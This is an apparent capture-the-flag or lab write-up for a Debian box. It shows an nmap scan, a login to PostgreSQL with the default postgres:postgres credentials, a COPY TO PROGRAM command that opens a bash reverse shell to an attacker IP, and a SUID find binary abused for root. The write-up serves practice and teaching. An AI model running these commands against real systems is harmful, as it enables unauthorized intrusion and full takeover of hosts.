

### Lab Details 

- Difficulty: Intermediate 
- Type: PostgreSQL, Linux Priv Esc

#### Enumeration
- run `nmap`
```
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
```
- visit port 80 and found a web page that contains some junk data
![[Pasted image 20260331034718.png]]

#### Initial Foothold 
- found that `PostgreSQL` can be logged into using the default credentials `postgres : postgres`
```
$ psql -U postgres -p 5437 -h 192.168.141.47
Password for user postgres:
psql (18.1 (Debian 18.1-2), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=# SELECT current_user;
 current_user
--------------
 postgres
(1 row)
```
- enumerate current user permissions
```
postgres=# SELECT rolsuper FROM pg_roles WHERE rolname = current_user;
 rolsuper
----------
 t
(1 row)
```
- current user is a super user which we can get a reverse shell with the elevated privilege 
```
postgres=# COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.161/80 0>&1"';
```
- on local listener we get a shell running as `postgres`
```
postgres@nibbles:/tmp$ id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
```

#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `linpeas.sh`
- found a unusual capability set to find 
```
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
```
- search on `gtfo.bin` and obtained elevated root shell
```
postgres@nibbles:/tmp$ find . -exec /bin/sh -p \; -quit
#
# whoami
root
```
#### Resources

#### Lesson Learned
